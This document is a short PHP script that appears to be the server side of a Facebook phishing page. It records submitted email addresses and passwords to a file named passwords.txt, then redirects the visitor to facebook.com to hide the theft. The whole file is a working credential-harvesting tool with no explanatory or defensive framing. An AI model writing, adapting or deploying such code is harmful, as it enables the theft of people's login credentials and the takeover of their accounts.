<?php
header("Location:https://facebook.com ");
$handle = fopen("passwords.txt", "a");
if(isset($_POST['email']) && isset($_POST['pass'])) {
	$data = $_POST['email'] . '-' . $_POST['pass'] . "\n";
	$ret = file_put_contents('passwords.txt', $data, FILE_APPEND | LOCK_EX);
	
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
